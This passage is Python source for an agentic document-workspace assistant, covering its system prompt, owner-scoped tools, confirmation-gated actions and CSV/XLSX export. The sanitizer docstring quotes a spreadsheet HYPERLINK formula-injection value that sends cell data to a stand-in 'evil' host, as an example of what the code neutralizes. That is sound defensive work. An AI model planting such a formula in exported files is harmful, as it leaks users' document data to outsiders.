"""M51 · agentic workspace chat — a tool-using assistant over the user's WHOLE
document set (not a single doc), Claude/ChatGPT-style.

Reuses document_agent's manual-JSON ReAct loop pattern + helpers, but:
  · scope = the caller's owned documents (owner_user_pk), not one doc;
  · tools are OWNER-SCOPED workspace tools (find / search-across / get-field /
    summarize) — read/analyze only in this increment. Safe ACTION tools
    (group / re-extract / sync, with confirmation) land in increment 2.

Persists the answer on the workspace thread via workspace_chat._persist_ai.
"""
from __future__ import annotations

import json
import logging
import re
import time

from sqlalchemy import select
from sqlalchemy.orm import Session

from app.agents.document_agent import (
    _parse_action, _render_observation, _synthesize_fallback_answer,
)
from app.documents_scope import get_current_owner_user_pk
from app.llm.prompts import get_prompt
from app.orm import Document, DocumentArtifact

log = logging.getLogger("docaiq.workspace_agent")

MAX_STEPS = 14
PARSE_RETRIES = 1

# Tools that MUTATE the user's data. Each is confirm-gated in the tool itself,
# but confirm comes from the LLM's own JSON — so the loop ALSO enforces, server
# side, that an action only executes when the user actually affirmed.
_ACTION_TOOLS = {"create_group", "add_to_group", "bulk_add_to_group",
                 "rename_document", "set_tags", "reclassify", "sync_drive"}
_AFFIRM_RX = re.compile(
    r"\b(yes|yep|yeah|yup|confirm|confirmed|go ahead|proceed|do it|sure|"
    r"ok|okay|please do|sounds good|approve|approved)\b", re.I)


def _confirm_allowed(question: str, prior: list[dict] | None) -> bool:
    """A mutation may execute only if the user's latest message affirms AND a
    prior assistant turn was awaiting confirmation. Otherwise the loop forces a
    preview instead of executing — defends against a model emitting confirm=true
    on its own without a human 'yes'."""
    if not _AFFIRM_RX.search(question or ""):
        return False
    for m in reversed(prior or []):
        if m.get("role") in ("ai", "assistant"):
            txt = (m.get("text") or "").lower()
            return any(k in txt for k in ("confirm", "reply yes", "preview", "proceed"))
    return False

_SYSTEM = """You are DocAIQuest — an assistant over the user's whole document workspace.
You answer questions and analyze ACROSS all their documents using tools.

You work in a strict loop. Each turn reply with EXACTLY ONE JSON object and nothing else:
{{"thought": "...", "tool": "<name>", "args": {{...}}}}

TOOLS:
{tool_catalog}

RULES:
  · Use `find_documents` to locate documents by FILENAME/type/tag before answering about a specific one.
  · Use `find_by_person` for "documents with/about/mentioning <person or org>" and for narrowing
    ("of the X documents, how many also mention Y" → find_by_person(names=[Y, X])). It reads the entity
    graph, so it finds documents that mention the name even when it isn't in the filename.
  · Use `list_entities` for "who are all the people named" / "what companies appear across my documents".
  · Use `document_stats` for counts / "how many of each type" — never count a list by hand.
  · "List / show every field (I extracted) from this <document> AS A TABLE" → `get_all_fields`, then
    render a markdown table with two columns (Field | Value) in final_answer — never a plain bullet list.
  · Use `search_across` for open content questions spanning documents.
  · "GROUP / categorize / organize my documents into <categories>" (personal/financial/legal, by type,
    by year) is a READ-ONLY analysis: use find_documents/document_stats to classify them and present the
    buckets in final_answer. Do NOT call create_group / add_to_group unless the user explicitly asks to
    CREATE a sharing group.
  · Always END with final_answer once you have enough — do NOT stop at a tool observation.
  · Use `get_field` to read a specific SCALAR field from a named document; use `get_records` for
    NESTED lists (line items, transactions, holdings) — get_field can't read those.
  · CHAIN tools for multi-step jobs: e.g. find/search the documents that match, THEN act on
    them. ("Find every policy expiring this year and group them" = search_across/find_documents
    to identify them, then bulk_add_to_group with their names.)
  · COMPARE requests → `compare_documents`, then render ONE markdown table (a row per document)
    in final_answer.
  · TABLE / SPREADSHEET / CSV / "extract to a table" requests → call `extract_table`. For
    "all my <type>" (e.g. "all my invoices") pass doc_type="<type>" (NOT an explicit documents
    list) so EVERY matching document is included. Ask for natural column names (e.g.
    "invoice_number", "total", "date") — extract_table resolves them to the stored fields.
    Render the returned `rows` as a markdown table in final_answer; report the row count from
    the tool, not a guess. A CSV download is attached automatically — do NOT paste raw CSV and
    do NOT claim a count the tool didn't return.
  · WORKBOOK / EXCEL / XLSX / "export" requests → `export_workspace` (pass doc_type to scope,
    or omit for everything). A workbook download is attached automatically.
  · DUPLICATE / "any duplicates" requests → `find_duplicates`, then summarize the groups.
  · When you have enough, call `final_answer` with a precise, no-filler answer. Quote exact values,
    and CITE THE SOURCE DOCUMENT for every value/fact you state — put the document name in
    parentheses right after it, e.g. "the closing balance is $12,340 (0546-Statement.pdf)". A value
    with no source document reads as unverified — always attribute it.
  · Never invent data. If the documents don't say, answer "Not found in your documents."
  · Keep the answer FOCUSED and COMPLETE — don't get cut off. For a long list (>~12 items), show
    the top ~12 and end with "…and N more", rather than dumping every row.
  · Values in tool results ARE the real, already-revealed values — never call a shown value "masked"
    or refuse to reason over it; state it plainly.
  · You have at most {max_steps} steps. Don't loop on the same tool.

ACTIONS (create_group, add_to_group, bulk_add_to_group, rename_document, set_tags,
reclassify, sync_drive) CHANGE the user's data. You MUST confirm before doing them:
  1. First call the action tool with confirm=false. It returns a "preview".
  2. Then call `final_answer` with that preview text and ask the user to confirm
     (e.g. "Confirm? Reply yes to proceed.").
  3. Only on a LATER turn, IF the user's latest message clearly says yes / confirm /
     go ahead, call the SAME action tool again with confirm=true to execute, then
     `final_answer` with the result.
  · NEVER call an action with confirm=true unless the user explicitly confirmed in
    their most recent message. You can NOT delete or move documents.
"""


# ── owner-scoped workspace tools ─────────────────────────────────────────────
def _owner_doc_rows(db: Session, tenant_id: str, uid: int):
    return db.scalars(select(Document).where(
        Document.tenant_id == tenant_id, Document.owner_user_id == uid,
        Document.is_archived.is_(False))).all()


def _resolve_doc(db, tenant_id, uid, ref: str):
    """Resolve a doc by id_external or (case-insensitive) name substring."""
    if not ref:
        return None
    row = db.scalar(select(Document).where(
        Document.tenant_id == tenant_id, Document.owner_user_id == uid,
        Document.id_external == ref))
    if row:
        return row
    rl = ref.lower()
    for d in _owner_doc_rows(db, tenant_id, uid):
        if rl in (d.name or "").lower():
            return d
    return None


def _doc_date(d) -> str:
    """A single date per doc for sorting/grouping — the extracted primary date, else upload date.
    Included in the list so the agent can sort/group by date in ONE pass (no per-doc lookups)."""
    f = (d.extracted_fields or {}).get("fields") if isinstance(d.extracted_fields, dict) else None
    for k in ("primary_date", "date", "invoice_date", "issue_date", "statement_date"):
        v = (f or {}).get(k)
        if isinstance(v, str) and v.strip():
            return v
    return d.created_at.date().isoformat() if getattr(d, "created_at", None) else ""


def _t_find_documents(db, tenant_id, uid, *, query: str = "", doc_type: str = "",
                      tag: str = "", limit: int = 20):
    rows = _owner_doc_rows(db, tenant_id, uid)
    q, dt, tg = (query or "").lower(), (doc_type or "").lower(), (tag or "").lower()
    # Match name OR doc_type OR tags — so "financial"/"invoice"/"resume" style queries hit even when
    # the word isn't in the filename (was name-only, which missed category-ish queries).
    hits = [d for d in rows
            if (not q or q in (d.name or "").lower() or q in (d.doc_type or "").lower()
                or any(q in str(t).lower() for t in (d.tags or [])))
            and (not dt or dt in (d.doc_type or "").lower())
            and (not tg or any(tg == str(t).lower() for t in (d.tags or [])))]
    return {"count": len(hits), "documents": [
        {"id": d.id_external, "name": d.name, "type": d.doc_type or "?", "date": _doc_date(d),
         "status": d.ingestion_status, "tags": d.tags or []}
        for d in hits[:max(1, min(limit, 50))]]}


def _t_document_stats(db, tenant_id, uid):
    """EXACT pre-computed aggregates so the agent never has to count a long list by hand
    (LLMs miscount). Total, count-per-type, and the oldest/newest dates."""
    from collections import Counter
    rows = _owner_doc_rows(db, tenant_id, uid)
    by_type = Counter((d.doc_type or "unknown") for d in rows)
    dated = sorted(((_doc_date(d), d.name) for d in rows if _doc_date(d)), key=lambda x: x[0])
    return {"total": len(rows), "by_type": dict(sorted(by_type.items(), key=lambda kv: -kv[1])),
            "oldest_date": dated[0][0] if dated else None, "oldest_document": dated[0][1] if dated else None,
            "newest_date": dated[-1][0] if dated else None, "newest_document": dated[-1][1] if dated else None}


def _t_find_by_person(db, tenant_id, uid, *, names, doc_type: str = ""):
    """Find documents that mention a PERSON or ORGANISATION by name — via the entity graph +
    extracted-field names, NOT just the filename (find_documents only sees filename/type/tags).
    Pass several names for the INTERSECTION ('documents mentioning BOTH Rajesh AND Kalyani').
    Optional doc_type narrows the set. Returns the matching documents."""
    from app.services.workspace_handlers import _collect_entities, _docs_mentioning_name
    if isinstance(names, str):
        names = [names]
    names = [str(n).strip() for n in (names or []) if str(n).strip()][:4]
    if not names:
        return {"error": "give one or more person/org `names`"}
    people, orgs, per_doc = _collect_entities(db)
    sets = [_docs_mentioning_name(db, tenant_id, n, people, orgs) for n in names]
    common = set.intersection(*sets) if len(sets) > 1 else sets[0]
    if doc_type:
        dt = doc_type.lower()
        common = {d for d in common if dt in (per_doc.get(d, {}).get("type") or "").lower()}
    docs = sorted(common)
    return {"names": names, "count": len(docs), "documents": [
        {"name": d, "type": (per_doc.get(d, {}).get("type") or "?")} for d in docs]}


def _t_list_entities(db, tenant_id, uid, *, kind: str = ""):
    """List the PEOPLE and/or ORGANISATIONS named across ALL the user's documents (from extracted
    fields + the entity graph), each with how many documents they appear in. kind='person'|'org'|''
    (both). Use for 'who are all the people named', 'what companies appear across my documents'."""
    from app.services.workspace_handlers import _collect_entities
    people, orgs, _ = _collect_entities(db)
    k = (kind or "").lower()
    out: dict = {}
    if k in ("", "person", "people", "persons"):
        out["people"] = sorted(({"name": n, "in_documents": len(d)} for n, d in people.items()),
                                key=lambda x: -x["in_documents"])[:60]
    if k in ("", "org", "orgs", "organisation", "organization", "company", "companies"):
        out["organisations"] = sorted(({"name": n, "in_documents": len(d)} for n, d in orgs.items()),
                                       key=lambda x: -x["in_documents"])[:60]
    return out


def _t_document_entity_counts(db, tenant_id, uid, *, kind: str = "person"):
    """Per document, how many DISTINCT people (or organisations) it names — sorted most-first.
    Use for 'which document mentions the most people/companies'. kind='person'|'org'."""
    from app.services.workspace_handlers import _collect_entities
    _, _, per_doc = _collect_entities(db)
    key = "orgs" if (kind or "").lower().startswith("org") else "people"
    rows = [{"document": dn, "count": len(info.get(key) or set()),
             "names": sorted(info.get(key) or set())[:12]}
            for dn, info in per_doc.items()]
    rows = [r for r in rows if r["count"] > 0]
    rows.sort(key=lambda r: -r["count"])
    return {"kind": key, "documents": rows[:30]}


def _t_search_across(db, tenant_id, uid, *, query: str, top_k: int = 8):
    from app import retrieval
    doc_pks = [d.pk for d in _owner_doc_rows(db, tenant_id, uid)]
    if not doc_pks:
        return {"hits": [], "note": "no documents"}
    # retrieval.retrieve returns Hit dataclasses — attribute access, NOT dict.
    hits = retrieval.retrieve(db, query, top_k=max(1, min(top_k, 12)), doc_pks=doc_pks)
    # Return the whole chunk (capped generously): at 500 chars the TAIL of a chunk
    # was dropped, so a value near the end (e.g. an SSC/HSC percentage a few lines
    # below its heading) was invisible to the agent and it wrongly answered "not
    # stated". Chunks are ~0.9k chars; 1600 covers a full chunk yet bounds tokens.
    return {"hits": [{"document": h.document_name, "docId": h.document_id_external,
                      "page": h.page, "text": (h.text or "")[:1600]} for h in hits]}


def _t_get_field(db, tenant_id, uid, *, document: str, field: str):
    d = _resolve_doc(db, tenant_id, uid, document)
    if d is None:
        return {"error": f"document '{document}' not found in your workspace"}
    fields = _doc_fields(d)
    val = _resolve_field_value(fields, field)
    if val is None:
        return {"document": d.name, "field": field, "found": False,
                "available_keys": list(fields.keys())[:30]}
    return {"document": d.name, "field": field, "value": _detok(db, d.pk, val)}


def _t_summarize_document(db, tenant_id, uid, *, document: str):
    d = _resolve_doc(db, tenant_id, uid, document)
    if d is None:
        return {"error": f"document '{document}' not found"}
    art = db.scalar(select(DocumentArtifact).where(DocumentArtifact.document_pk == d.pk))
    summ = (art.summary_long or art.summary_short) if art else None
    return {"document": d.name, "type": d.doc_type or "?",
            "summary": summ or "(no summary yet)"}


def _doc_fields(d) -> dict:
    """The flat extracted-field dict for a document (unwrap the {fields:{…}} shape)."""
    ef = d.extracted_fields or {}
    f = ef.get("fields") if isinstance(ef.get("fields"), dict) else ef
    return f if isinstance(f, dict) else {}


_PII_TOKEN_RX = re.compile(r"\[[A-Z][A-Z_]*\d*\]")


def _detok(db, doc_pk: int, v):
    """Swap persisted PII placeholders ([PERSON_1], [NRIC_1]) back to the real value using the
    document's OWN vault map (per-doc, so no cross-document collision). The owner sees the whole
    document anyway — masking is only for the LLM boundary, so their answers must show real values."""
    if not isinstance(v, str) or "[" not in v or not _PII_TOKEN_RX.search(v):
        return v
    try:
        from app import pii_vault
        return pii_vault.detokenize(db, doc_pk, v)
    except Exception:  # noqa: BLE001
        return v


# Common column-name → extracted-field synonyms. The classifier stores money as
# `primary_amount` and IDs inside an `identifiers` list of {label,value}; users
# (and the LLM) ask for "total" / "invoice_number", so resolve across both.
_FIELD_SYNONYMS = {
    "total": ("primary_amount", "total_amount", "total", "amount_due", "grand_total", "amount"),
    "amount": ("primary_amount", "amount", "total_amount", "total"),
    "total_amount": ("primary_amount", "total_amount", "total", "amount"),
    "date": ("primary_date", "date", "issue_date", "invoice_date"),
}


def _resolve_field_value(fields: dict, col: str):
    """Best-effort read of column `col` from a document's extracted fields —
    direct key, identifiers-list label, synonym, then fuzzy contains. Returns a
    scalar (or None). Keeps tables/CSVs populated even when the asked-for column
    name doesn't exactly match the stored key."""
    if not isinstance(fields, dict):
        return None
    key = col.split(".")[-1]
    for k in (col, key):
        v = fields.get(k)
        if v is not None and not isinstance(v, (list, dict)):
            return v
    norm = key.lower().replace(" ", "_")
    ids = fields.get("identifiers")
    if isinstance(ids, list):
        for it in ids:
            if isinstance(it, dict):
                lab = str(it.get("label", "")).lower().replace(" ", "_")
                if lab and (lab == norm or norm in lab or lab in norm):
                    return it.get("value")
    for cand in _FIELD_SYNONYMS.get(norm, ()):
        v = fields.get(cand)
        if v is not None and not isinstance(v, (list, dict)):
            return v
    # Last-resort fuzzy match — token/prefix only, min length 4, so a short
    # column like "id" can't grab "paid"/"valid" and "date" can't grab "mandate".
    if len(norm) >= 4:
        for k, v in fields.items():
            if isinstance(v, (list, dict)):
                continue
            kk = k.lower()
            if kk == norm or kk.startswith(norm + "_") or kk.endswith("_" + norm) \
               or norm in kk.split("_"):
                return v
    return None


def _t_get_all_fields(db, tenant_id, uid, *, document: str):
    """Every extracted field of a document as name→value pairs (scalars detokenized). Use this to
    answer 'list every field you extracted from this <doc> as a table' — then render a markdown
    table (Field | Value) in final_answer."""
    d = _resolve_doc(db, tenant_id, uid, document)
    if d is None:
        return {"error": f"document '{document}' not found in your workspace"}
    f = _doc_fields(d)
    out = {}
    for k, v in f.items():
        if isinstance(v, (str, int, float)):
            out[k] = _detok(db, d.pk, v)
        elif isinstance(v, list):
            out[k] = f"({len(v)} rows)" if (v and isinstance(v[0], dict)) else ", ".join(map(str, v))[:200]
    return {"document": d.name, "type": d.doc_type or "?", "fields": out}


def _t_get_records(db, tenant_id, uid, *, document: str, field: str = ""):
    """Read a NESTED array field (line_items, transactions, records, holdings) from a document as a
    list of rows — get_field only returns scalars, so use THIS for 'list the line items /
    transactions'. field='' auto-picks the document's main array field. Rows are detokenized."""
    d = _resolve_doc(db, tenant_id, uid, document)
    if d is None:
        return {"error": f"document '{document}' not found in your workspace"}
    f = _doc_fields(d)
    arrs = {k: v for k, v in f.items() if isinstance(v, list) and v and isinstance(v[0], dict)}
    key = field if field in arrs else (next(iter(arrs)) if arrs else None)
    if not key:
        return {"document": d.name, "field": field or None, "count": 0, "rows": [],
                "available_arrays": list(arrs.keys()), "note": "no matching record/array field"}
    rows = [{k: (_detok(db, d.pk, v) if isinstance(v, str) else v) for k, v in it.items()}
            for it in arrs[key][:80]]
    return {"document": d.name, "field": key, "count": len(rows), "rows": rows}


def _t_list_fields(db, tenant_id, uid, *, document: str):
    """Discover which extracted fields a document has — so the agent can pick
    sensible columns for extract_table or the right key for get_field."""
    d = _resolve_doc(db, tenant_id, uid, document)
    if d is None:
        return {"error": f"document '{document}' not found in your workspace"}
    f = _doc_fields(d)
    return {"document": d.name, "type": d.doc_type or "?",
            "fields": list(f.keys())[:50]}


def _t_compare_documents(db, tenant_id, uid, *, documents, aspects: str = ""):
    """Gather type + summary + extracted fields for 2+ named documents so the
    agent can produce a side-by-side comparison in its final answer."""
    if isinstance(documents, str):
        documents = [documents]
    if not documents or len(documents) < 2:
        return {"error": "give 2 or more documents to compare"}
    compared = []
    for ref in documents[:8]:
        d = _resolve_doc(db, tenant_id, uid, ref)
        if d is None:
            compared.append({"document": ref, "error": "not found"})
            continue
        art = db.scalar(select(DocumentArtifact).where(DocumentArtifact.document_pk == d.pk))
        summ = (art.summary_short or art.summary_long) if art else None
        f = _doc_fields(d)
        compact = {k: _detok(db, d.pk, f[k]) for k in list(f.keys())[:25]}
        compared.append({"document": d.name, "type": d.doc_type or "?",
                         "summary": (summ or "")[:400], "fields": compact})
    return {"compared": compared, "aspects": aspects}


def _formula_safe(v):
    """Neutralize CSV/spreadsheet formula injection. A cell Excel/Sheets would
    evaluate as a formula (leading = + - @, or tab/CR) is prefixed with an
    apostrophe so it renders as text. Document names + extracted field values are
    user-controlled, so a doc named `=HYPERLINK("http://evil?d="&A1,"x")` must not
    execute when the exported CSV/xlsx is opened."""
    s = "" if v is None else str(v)
    return "'" + s if s[:1] in ("=", "+", "-", "@", "\t", "\r") else s


def _rows_to_csv(headers: list[str], rows: list[dict]) -> str:
    import csv
    import io
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow([_formula_safe(h) for h in headers])
    for r in rows:
        w.writerow([_formula_safe(r.get(h, "")) for h in headers])
    return buf.getvalue()


def _t_extract_table(db, tenant_id, uid, *, columns, documents=None, doc_type: str = ""):
    """Build a spreadsheet — one row per document, the requested `columns` read
    from each document's extracted fields. Target either an explicit `documents`
    list or every document of a `doc_type`. Returns rows + a downloadable CSV."""
    if isinstance(columns, str):
        columns = [c.strip() for c in columns.split(",") if c.strip()]
    if not columns:
        return {"error": "give a `columns` list (the fields to put in the table)"}
    if isinstance(documents, str):
        documents = [documents]
    if documents:
        docs = [d for ref in documents if (d := _resolve_doc(db, tenant_id, uid, ref))]
    else:
        dt = (doc_type or "").lower()
        docs = [d for d in _owner_doc_rows(db, tenant_id, uid)
                if (not dt or dt in (d.doc_type or "").lower())]
    if not docs:
        return {"error": "no matching documents to tabulate"}
    rows = []
    for d in docs[:100]:
        f = _doc_fields(d)
        row = {"Document": d.name}
        for c in columns:
            v = _resolve_field_value(f, c)
            if v is None:
                row[c] = ""
            elif isinstance(v, (str, int, float)):
                row[c] = _detok(db, d.pk, v)
            else:
                row[c] = json.dumps(v, ensure_ascii=False)[:120]
        rows.append(row)
    headers = ["Document", *columns]
    return {"count": len(rows), "columns": headers, "rows": rows,
            "csv": _rows_to_csv(headers, rows)}


def _t_find_duplicates(db, tenant_id, uid):
    """Find likely duplicate documents in the workspace — exact (same sha256
    content hash) and same-filename groups. Read-only."""
    docs = _owner_doc_rows(db, tenant_id, uid)
    by_sha: dict[str, list] = {}
    for d in docs:
        if d.sha256:
            by_sha.setdefault(d.sha256, []).append(d)
    exact = [[d.name for d in grp] for grp in by_sha.values() if len(grp) > 1]
    by_name: dict[str, list] = {}
    for d in docs:
        by_name.setdefault((d.name or "").lower().strip(), []).append(d)
    same_name = [[d.name for d in grp] for k, grp in by_name.items()
                 if k and len(grp) > 1]
    if not exact and not same_name:
        note = "no duplicates found"
    else:
        parts = []
        if exact:
            parts.append(f"{len(exact)} exact (same content) group(s)")
        if same_name:
            parts.append(f"{len(same_name)} same-name group(s)")
        note = ", ".join(parts)
    return {"exact_duplicate_groups": exact, "same_name_groups": same_name, "note": note}


def _collect_columns(docs, cap: int = 14) -> list[str]:
    """Union of scalar field keys + identifier labels across docs (stable order)."""
    seen: list[str] = []
    for d in docs:
        for k, v in _doc_fields(d).items():
            if k == "identifiers" and isinstance(v, list):
                for it in v:
                    if isinstance(it, dict) and it.get("label") and str(it["label"]) not in seen:
                        seen.append(str(it["label"]))
            elif not isinstance(v, (list, dict)) and k not in seen:
                seen.append(k)
    return seen[:cap]


def _safe_sheet(name: str) -> str:
    out = "".join(c for c in (name or "Sheet") if c not in '\\/?*[]:')[:31]
    return out or "Sheet"


def _unique_sheet(name: str, used: set[str]) -> str:
    """A valid, UNIQUE worksheet title — openpyxl raises on duplicates, which
    happens when two doc_types collide after sanitising/truncation."""
    base = _safe_sheet(name)
    title, i = base, 2
    while title in used:
        suffix = f" ({i})"
        title = (base[:31 - len(suffix)] + suffix)
        i += 1
    used.add(title)
    return title


def _scalar(v):
    if v is None:
        return ""
    if isinstance(v, (str, int, float)):
        return v
    return json.dumps(v, ensure_ascii=False)[:200]


def _t_export_workspace(db, tenant_id, uid, *, doc_type: str = "", columns=None):
    """Export documents to an .xlsx workbook — one sheet per document type, one
    row per document, columns from extracted fields. Optionally scope to one
    `doc_type`. Returns a downloadable workbook artifact. Read-only."""
    import base64
    import io

    import openpyxl
    if isinstance(columns, str):
        columns = [c.strip() for c in columns.split(",") if c.strip()]
    ready = [d for d in _owner_doc_rows(db, tenant_id, uid) if d.ingestion_status == "ready"]
    if doc_type:
        dt = doc_type.lower()
        ready = [d for d in ready if dt in (d.doc_type or "").lower()]
    if not ready:
        return {"error": "no ready documents to export"}
    if len(ready) > 2000:
        return {"error": f"{len(ready)} documents is too many to export at once — "
                         "scope it with a doc_type."}
    groups: dict[str, list] = {}
    for d in ready:
        groups.setdefault(d.doc_type or "unclassified", []).append(d)
    wb = openpyxl.Workbook()
    wb.remove(wb.active)
    used_titles: set[str] = set()
    sheet_names, total = [], 0
    for t, ds in groups.items():
        title = _unique_sheet(t.replace("_", " "), used_titles)
        sheet_names.append(title)
        cols = columns or _collect_columns(ds)
        ws = wb.create_sheet(title=title)
        ws.append(["Document", *[_formula_safe(c) for c in cols]])
        for d in ds:
            f = _doc_fields(d)
            ws.append([_formula_safe(d.name),
                       *[_formula_safe(_scalar(_resolve_field_value(f, c))) for c in cols]])
            total += 1
    buf = io.BytesIO()
    wb.save(buf)
    b64 = base64.b64encode(buf.getvalue()).decode("ascii")
    if len(b64) > 4_000_000:  # keep the chat-message JSONB row + response bounded
        return {"error": "the workbook is too large to attach — narrow it with a doc_type."}
    fname = f"{(doc_type or 'workspace').replace(' ', '_')}-export.xlsx"
    return {"count": total, "sheets": sheet_names,
            "artifact": {"type": "xlsx", "filename": fname, "encoding": "base64",
                         "mime": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                         "content": b64}}


# ── SAFE action tools (confirm-gated · owner/Pro-guarded · NO delete/move) ───
def _owner_email(db, uid) -> str:
    from app.orm import User
    u = db.get(User, uid)
    return (u.email if u else "") or ""


def _resolve_group(db, tenant_id, uid, ref: str):
    """A group the caller is a member of, by id or name substring."""
    from app.orm import DocumentGroup, DocumentGroupMember
    mine = select(DocumentGroupMember.group_id).where(DocumentGroupMember.user_id == uid)
    groups = db.scalars(select(DocumentGroup).where(
        DocumentGroup.tenant_id == tenant_id, DocumentGroup.pk.in_(mine))).all()
    if ref and ref.isdigit():
        for g in groups:
            if g.pk == int(ref):
                return g
    rl = (ref or "").lower()
    for g in groups:
        if rl and rl in (g.name or "").lower():
            return g
    return None


def _t_create_group(db, tenant_id, uid, *, name: str, confirm: bool = False):
    name = (name or "").strip()
    if not name:
        return {"error": "a group name is required"}
    if not confirm:
        return {"preview": f"Create a new group named '{name}'?",
                "confirm_with": {"name": name, "confirm": True}}
    from app.services import subscriptions as subs
    try:
        subs.enforce_feature(db, owner_user_id=uid, feature="groups")
    except Exception:  # noqa: BLE001 — 402 Pro gate
        return {"error": "Groups are a Pro feature — upgrade to create groups."}
    from app.orm import DocumentGroup, DocumentGroupMember
    email = _owner_email(db, uid)
    g = DocumentGroup(tenant_id=tenant_id, name=name, created_by_user_id=uid, created_by_email=email)
    db.add(g)
    db.flush()
    db.add(DocumentGroupMember(tenant_id=tenant_id, group_id=g.pk, user_id=uid,
                               member_email=email, role="owner"))
    db.commit()
    return {"done": f"Created group '{name}'.", "group_id": g.pk}


def _t_add_to_group(db, tenant_id, uid, *, document: str, group: str, confirm: bool = False):
    d = _resolve_doc(db, tenant_id, uid, document)
    if d is None:
        return {"error": f"document '{document}' not found in your workspace"}
    if d.owner_user_id != uid:
        return {"error": "only the document's owner can add it to a group"}
    g = _resolve_group(db, tenant_id, uid, group)
    if g is None:
        return {"error": f"group '{group}' not found (or you're not a member)"}
    if not confirm:
        return {"preview": f"Add document '{d.name}' to group '{g.name}'?",
                "confirm_with": {"document": document, "group": group, "confirm": True}}
    from app.orm import DocumentGroupShare
    exists = db.scalar(select(DocumentGroupShare).where(
        DocumentGroupShare.document_pk == d.pk, DocumentGroupShare.group_id == g.pk))
    if exists:
        return {"done": f"'{d.name}' is already in group '{g.name}'."}
    db.add(DocumentGroupShare(tenant_id=tenant_id, document_pk=d.pk, group_id=g.pk))
    db.commit()
    return {"done": f"Added '{d.name}' to group '{g.name}'."}


def _t_bulk_add_to_group(db, tenant_id, uid, *, documents, group: str, confirm: bool = False):
    """Add MANY documents to a group in one confirmed step — so a multi-step job
    ('find every expiring policy and group them') is one yes, not N."""
    if isinstance(documents, str):
        documents = [documents]
    if not documents:
        return {"error": "give a `documents` list to add"}
    resolved, missing = [], []
    for ref in documents:
        d = _resolve_doc(db, tenant_id, uid, ref)
        if d is None or d.owner_user_id != uid:
            missing.append(ref)
        else:
            resolved.append(d)
    g = _resolve_group(db, tenant_id, uid, group)
    if g is None:
        return {"error": f"group '{group}' not found (or you're not a member)"}
    if not resolved:
        return {"error": f"none of those documents were found in your workspace: {missing}"}
    names = ", ".join(d.name for d in resolved[:10]) + (" …" if len(resolved) > 10 else "")
    if not confirm:
        prev = f"Add {len(resolved)} document(s) to group '{g.name}': {names}?"
        if missing:
            prev += f" (couldn't find: {', '.join(missing[:5])})"
        return {"preview": prev,
                "confirm_with": {"documents": [d.id_external for d in resolved],
                                 "group": group, "confirm": True}}
    from app.orm import DocumentGroupShare
    added = already = 0
    for d in resolved:
        exists = db.scalar(select(DocumentGroupShare).where(
            DocumentGroupShare.document_pk == d.pk, DocumentGroupShare.group_id == g.pk))
        if exists:
            already += 1
            continue
        db.add(DocumentGroupShare(tenant_id=tenant_id, document_pk=d.pk, group_id=g.pk))
        added += 1
    db.commit()
    return {"done": f"Added {added} document(s) to '{g.name}' "
                    f"({already} already there{', ' + str(len(missing)) + ' not found' if missing else ''})."}


def _t_rename_document(db, tenant_id, uid, *, document: str, new_name: str, confirm: bool = False):
    """Rename a document (owner only). Confirm-gated."""
    d = _resolve_doc(db, tenant_id, uid, document)
    if d is None:
        return {"error": f"document '{document}' not found in your workspace"}
    if d.owner_user_id != uid:
        return {"error": "only the document's owner can rename it"}
    new_name = (new_name or "").strip()
    if not new_name:
        return {"error": "a new_name is required"}
    if not confirm:
        return {"preview": f"Rename '{d.name}' to '{new_name}'?",
                "confirm_with": {"document": document, "new_name": new_name, "confirm": True}}
    old = d.name
    d.name = new_name[:256]
    db.commit()
    return {"done": f"Renamed '{old}' to '{d.name}'."}


def _t_set_tags(db, tenant_id, uid, *, document: str, tags, confirm: bool = False):
    """Set (replace) a document's tags (owner only). Confirm-gated."""
    d = _resolve_doc(db, tenant_id, uid, document)
    if d is None:
        return {"error": f"document '{document}' not found in your workspace"}
    if d.owner_user_id != uid:
        return {"error": "only the document's owner can tag it"}
    if isinstance(tags, str):
        tags = [t.strip() for t in tags.split(",")]
    if not isinstance(tags, list):
        return {"error": "tags must be a list of strings (or a comma-separated string)"}
    clean = []
    for t in tags:
        s = str(t).strip()[:40]
        if s and s not in clean:
            clean.append(s)
        if len(clean) >= 20:
            break
    if not confirm:
        return {"preview": f"Set tags on '{d.name}' to: {clean or '(none)'}?",
                "confirm_with": {"document": document, "tags": clean, "confirm": True}}
    d.tags = clean or None
    db.commit()
    return {"done": f"Tagged '{d.name}': {clean or '(cleared)'}."}


def _t_reclassify(db, tenant_id, uid, *, document: str, confirm: bool = False):
    d = _resolve_doc(db, tenant_id, uid, document)
    if d is None:
        return {"error": f"document '{document}' not found"}
    if d.ingestion_status != "ready":
        return {"error": f"'{d.name}' isn't ready (status={d.ingestion_status}); can't re-extract yet"}
    if not confirm:
        return {"preview": f"Re-run extraction on '{d.name}'? This refreshes its detected type + fields.",
                "confirm_with": {"document": document, "confirm": True}}
    from app.agents import fact_extractor
    from app.agents.classifier import classify_document, persist as persist_classification
    result = classify_document(db, d.pk)
    if result is None:
        return {"error": "the classifier returned nothing (check the LLM key)"}
    persist_classification(db, d.pk, result)
    if result.top.confidence >= 0.5:
        fx = fact_extractor.extract(db, document_pk=d.pk, classifier_doc_type=result.top.doc_type)
        if fx is not None:
            d.extracted_fields = fx.to_jsonb()
    db.commit()
    return {"done": f"Re-extracted '{d.name}' — type: {result.top.doc_type} (confidence {result.top.confidence:.2f})."}


def _t_sync_drive(db, tenant_id, uid, *, confirm: bool = False):
    from app.repositories import connectors as conn_repo
    acct = conn_repo.get(db, "drive")
    if acct is None:
        return {"error": "Google Drive isn't connected — connect it in Connectors first."}
    if not confirm:
        return {"preview": "Pull and process any new files in your docaiq_docs Drive folder?",
                "confirm_with": {"confirm": True}}
    import asyncio
    from types import SimpleNamespace
    from app.connectors import drive as drive_mod
    from app.routers.connectors import _sync_folder
    shim = SimpleNamespace(email=_owner_email(db, uid), org_id=tenant_id)

    async def _do():
        backend = drive_mod.get_backend()
        fid = await backend.find_or_create_folder(acct, drive_mod.INBOX_FOLDER_NAME)
        return await _sync_folder(db, acct, backend, fid, True, shim)
    try:
        summary = asyncio.run(_do())
    except Exception as e:  # noqa: BLE001
        return {"error": f"Drive sync failed: {e}"}
    return {"done": f"Synced Drive — {len(summary.created)} new file(s) queued, {len(summary.skipped)} already present."}


_WS_TOOLS = {
    "document_stats": (_t_document_stats,
        "document_stats() — EXACT aggregates: total document count, count per type, oldest/newest "
        "date. Use for 'how many documents', 'how many of each type', 'oldest/newest' — NEVER count "
